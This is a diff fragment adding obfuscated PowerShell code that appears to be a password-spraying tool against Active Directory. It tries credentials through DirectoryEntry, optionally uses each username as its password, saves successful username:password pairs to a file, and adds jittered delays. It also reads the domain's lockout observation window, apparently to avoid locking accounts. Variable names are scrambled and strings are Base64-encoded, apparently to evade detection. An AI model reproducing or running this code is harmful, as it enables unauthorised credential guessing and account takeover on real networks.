+        if ($UsernameAsPassword)
+        {
+            $Password = ${____/\/\/=\_/\/==}
+        }
+        ${/=\____/\___/\/==} = New-Object System.DirectoryServices.DirectoryEntry($Domain,${____/\/\/=\_/\/==},$Password)
+        if (${/=\____/\___/\/==}.name -ne $null)
+        {
+            if ($OutFile -ne "")
+            {
+                ac $OutFile ${____/\/\/=\_/\/==}`:$Password
+            }
+            Write-Host -ForegroundColor Green $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAFUAQwBDAEUAUwBTACEAIABVAHMAZQByADoAJAB7AF8AXwBfAF8ALwBcAC8AXAAvAD0AXABfAC8AXAAvAD0APQB9ACAAUABhAHMAcwB3AG8AcgBkADoAJABQAGEAcwBzAHcAbwByAGQA')))
+        }
+        ${_/===\/\/==\/=\/\} += 1
+        if (-not $Quiet)
+        {
+            Write-Host -nonewline $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0APQBcAC8AXAAvAD0APQBcAC8APQBcAC8AXAB9ACAAbwBmACAAJAB7AC8APQA9AD0AXABfAC8APQA9AFwAXwAvAD0APQBcAF8ALwB9ACAAdQBzAGUAcgBzACAAdABlAHMAdABlAGQADQA=')))
+        }
+        if ($Delay)
+        {
+            sleep -Seconds ${/=\/\/=\/==\____/}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+        }
+    }
+}
+function _____/\/\/=\_____/(${_/=\_/\/\___/\__/\})
+{
+    ${_/=\_/\/\___/\__/\} = [ADSI]${_/=\_/\/\___/\__/\}
+    ${_/====\___/==\/=\} = ${_/=\_/\/\___/\__/\}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdABPAGIAcwBlAHIAdgBhAHQAaQBvAG4AVwBpAG4AZABvAHcA')))]
+    ${__/======\/==\/==} = ${_/=\_/\/\___/\__/\}.ConvertLargeIntegerToInt64(${_/====\___/==\/=\}.Value) / -600000000
+    return ${__/======\/==\/==}
+}
